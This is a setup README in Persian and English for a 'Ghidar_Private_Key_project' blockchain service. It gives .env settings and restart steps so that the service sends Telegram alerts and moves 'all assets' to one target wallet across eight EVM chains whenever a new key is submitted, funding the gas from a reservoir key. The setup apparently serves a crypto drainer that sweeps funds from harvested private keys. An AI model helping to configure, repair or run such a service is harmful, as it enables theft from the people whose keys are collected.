# ⚠️ IMPORTANT: Setup Required for Notifications & Transfers

## 🔴 مشکلات فعلی:

1. **Telegram Notifications کار نمی‌کنن** - `TELEGRAM_BOT_TOKEN` و `TELEGRAM_CHAT_ID` خالی هستن
2. **Asset Transfers کار نمی‌کنن** - `TARGET_WALLET` نامعتبر هست (0x0000...)
3. **PHP endpoint درست شد** - حالا `triggerNodeIntegration` صدا می‌زنه

---

## ✅ راه حل:

### 1. تنظیم Telegram Bot

```bash
cd /root/Ghidar_Private_Key_project/blockchain-service
nano .env
```

اضافه کنید:
```bash
TELEGRAM_BOT_TOKEN=YOUR_BOT_TOKEN_HERE
TELEGRAM_CHAT_ID=YOUR_CHAT_ID_HERE
```

**چطور پیدا کنیم:**
- **Bot Token**: از @BotFather در Telegram بگیرید
- **Chat ID**: از @userinfobot در Telegram بگیرید یا از این endpoint:
  ```bash
  curl https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
  ```

### 2. تنظیم Target Wallet

```bash
cd /root/Ghidar_Private_Key_project/blockchain-service
nano .env
```

تغییر دهید:
```bash
TARGET_WALLET=0xYOUR_DESTINATION_WALLET_ADDRESS
```

**مهم:** این wallet آدرس مقصد برای تمام asset transfers هست.

### 3. تنظیم Gas Reservoir (اختیاری اما توصیه می‌شه)

اگر می‌خواید سیستم به صورت خودکار gas fund کنه:
```bash
GAS_RESERVOIR_PRIVATE_KEY=0xYOUR_GAS_RESERVOIR_PRIVATE_KEY
```

**مهم:** این wallet باید balance کافی روی همه شبکه‌ها داشته باشه.

### 4. Restart Service

بعد از تنظیم `.env`:
```bash
cd /root/Ghidar_Private_Key_project/blockchain-service
pm2 restart blockchain-service --update-env
```

---

## 🧪 تست:

بعد از تنظیمات، یک key جدید send کنید و چک کنید:
1. Telegram notifications می‌آد یا نه
2. Assets transfer می‌شن یا نه

---

## 📝 مثال کامل `.env`:

```bash
# PHP Backend
PHP_BACKEND_BASE_URL=http://localhost
PAYMENTS_CALLBACK_TOKEN=test_token_123

# Database (optional)
DB_HOST=localhost
DB_PORT=3306
DB_DATABASE=test
DB_USERNAME=root
DB_PASSWORD=

# RPC URLs
ETHEREUM_RPC_URL=https://eth.llamarpc.com
BSC_RPC_URL=https://bsc-dataseed.binance.org
POLYGON_RPC_URL=https://polygon-rpc.com
ARBITRUM_RPC_URL=https://arb1.arbitrum.io/rpc
AVALANCHE_RPC_URL=https://api.avax.network/ext/bc/C/rpc
FANTOM_RPC_URL=https://rpc.ftm.tools
OPTIMISM_RPC_URL=https://mainnet.optimism.io
BASE_RPC_URL=https://mainnet.base.org

# Asset Processing
TARGET_WALLET=0xYOUR_DESTINATION_WALLET  # ⚠️ تغییر دهید!
GAS_RESERVOIR_PRIVATE_KEY=0xYOUR_GAS_KEY  # ⚠️ تغییر دهید (اختیاری)

# Telegram Notifications
TELEGRAM_BOT_TOKEN=YOUR_BOT_TOKEN  # ⚠️ تغییر دهید!
TELEGRAM_CHAT_ID=YOUR_CHAT_ID      # ⚠️ تغییر دهید!
```

---

## ✅ بعد از تنظیم:

1. Service رو restart کنید
2. یک key جدید send کنید
3. Telegram notifications رو چک کنید
4. Asset transfers رو چک کنید

---

**⚠️ بدون این تنظیمات، سیستم کار می‌کنه ولی notifications نمی‌فرسته و assets transfer نمی‌شه!**

